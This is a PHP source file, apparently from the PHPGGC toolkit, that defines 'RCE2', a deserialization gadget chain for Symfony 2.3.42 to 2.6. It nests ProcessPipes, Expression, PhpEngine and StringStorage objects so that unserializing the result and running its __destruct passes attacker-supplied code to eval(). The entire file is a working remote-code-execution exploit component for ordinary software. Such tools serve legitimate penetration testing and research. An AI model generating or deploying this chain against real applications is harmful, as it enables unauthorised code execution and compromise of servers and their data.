<?php

namespace GadgetChain\Symfony;

class RCE2 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '2.3.42 < 2.6';
    public static $vector = '__destruct';
    public static $author = 'crlf';
    public static $information = 'Executes through eval() ( <?php \'.$code.\';die(); ?> )';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        return new \Symfony\Component\Process\ProcessPipes(
               new \Symfony\Component\Finder\Expression\Expression(
               new \Symfony\Component\Templating\PhpEngine(
               new \Symfony\Component\Templating\Storage\StringStorage(
               $code
               ))));
    }
}
